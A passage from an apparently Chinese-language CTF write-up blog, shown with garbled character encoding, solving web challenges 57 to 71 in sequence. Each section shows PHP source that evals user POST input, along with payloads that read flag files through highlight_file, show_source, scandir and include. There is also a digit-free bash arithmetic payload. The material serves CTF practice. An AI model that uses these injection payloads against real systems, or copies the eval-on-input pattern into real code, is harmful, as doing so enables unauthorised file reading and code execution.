class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs erlang">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# echo <span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>())))<br>-1<br><br>â”Œâ”€â”€<span class="hljs-params">(rootã‰¿butt3rf1y)</span>-[/home/butt3rf1y]<br>â””â”€# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))<br>-2<br><br>â”Œâ”€â”€<span class="hljs-params">(rootã‰¿butt3rf1y)</span>-[/home/butt3rf1y]<br>â””â”€# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))<br>-4<br><br>â”Œâ”€â”€<span class="hljs-params">(rootã‰¿butt3rf1y)</span>-[/home/butt3rf1y]<br>â””â”€# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))<br>-8<br><br>â”Œâ”€â”€<span class="hljs-params">(rootã‰¿butt3rf1y)</span>-[/home/butt3rf1y]<br>â””â”€# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))))<br>-16<br><br>â”Œâ”€â”€<span class="hljs-params">(rootã‰¿butt3rf1y)</span>-[/home/butt3rf1y]<br>â””â”€# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))))))<br>-32<br><br>â”Œâ”€â”€<span class="hljs-params">(rootã‰¿butt3rf1y)</span>-[/home/butt3rf1y]<br>â””â”€# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))<br>-36<br><br>â”Œâ”€â”€<span class="hljs-params">(rootã‰¿butt3rf1y)</span>-[/home/butt3rf1y]<br>â””â”€# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))<br>-37<br></code></pre></td></tr></table></figure><p>æœ€åçš„ payload å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$((~$(($(($(($(($(($(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))))) $(($(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $((~$(())))))))))<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç æ‹¿åˆ° flag</p><p><a href="https://c.biancheng.net/view/2480.html">Shell (()) çš„ç”¨æ³•</a></p><h1 id="Web-58"><a href="#Web-58" class="headerlink" title="Web 58"></a>Web 58</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ç”¨ <code>highlight_file</code> å‡½æ•°è¾“å‡ºæ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-59"><a href="#Web-59" class="headerlink" title="Web 59"></a>Web 59</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯èƒ½ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å…¶ä»–å‡½æ•°ä¹Ÿèƒ½è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-60"><a href="#Web-60" class="headerlink" title="Web 60"></a>Web 60</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€æ ·çš„ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=show_source(&#x27;flag.php&#x27;);<br>c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-61-65"><a href="#Web-61-65" class="headerlink" title="Web 61-65"></a>Web 61-65</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒ Web 59</p><h1 id="Web-66"><a href="#Web-66" class="headerlink" title="Web 66"></a>Web 66</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡å‰é¢çš„ payload éƒ½ä¸è¡Œäº†ï¼Œåˆ—å‡º <code>/</code> ç›®å½•ä¸‹çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=print_r(scandir(&quot;/&quot;));<br>&gt;&gt;Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )<br></code></pre></td></tr></table></figure><p>è¯»å– flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-67"><a href="#Web-67" class="headerlink" title="Web 67"></a>Web 67</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>print_r()</code> å‡½æ•°è¢«ç¦äº†ï¼Œ<code>var_dump()</code> å’Œ <code>var_export()</code> éƒ½èƒ½ç”¨</p><p>è¿˜æ˜¯èƒ½ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-68"><a href="#Web-68" class="headerlink" title="Web 68"></a>Web 68</h1><p>æ²¡æœ‰æºç ï¼Œåªèƒ½ç”¨ <code>var_dump()</code> å‡½æ•°æ‰“å°ï¼Œç„¶åç”¨ <code>include()</code> å‡½æ•°è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-69"><a href="#Web-69" class="headerlink" title="Web 69"></a>Web 69</h1><p><code>var_dump()</code> ä¸è¡Œï¼Œæ¢æˆ <code>var_export()</code> å¯ä»¥ï¼Œç„¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-70"><a href="#Web-70" class="headerlink" title="Web 70"></a>Web 70</h1><p>è¿˜æ˜¯åªèƒ½ <code>var_export()</code> ï¼Œç„¶å payload åŒä¸Š</p><h1 id="Web-71"><a href="#Web-71" class="headerlink" title="Web 71"></a>Web 71</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>ini_set(&#x27;display_errors&#x27;, 0);<br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>        $s = ob_get_contents();<br>        ob_end_clean();<br>        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br><br>ä½ è¦ä¸Šå¤©å—ï¼Ÿ<br></code></pre></td></tr></table></figure><p>æºç ä¸­çš„ <code>ob_get_contents()</code> å‡½æ•°ï¼Œä¼šè¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ï¼Œ<code>ob_end_clean</code> 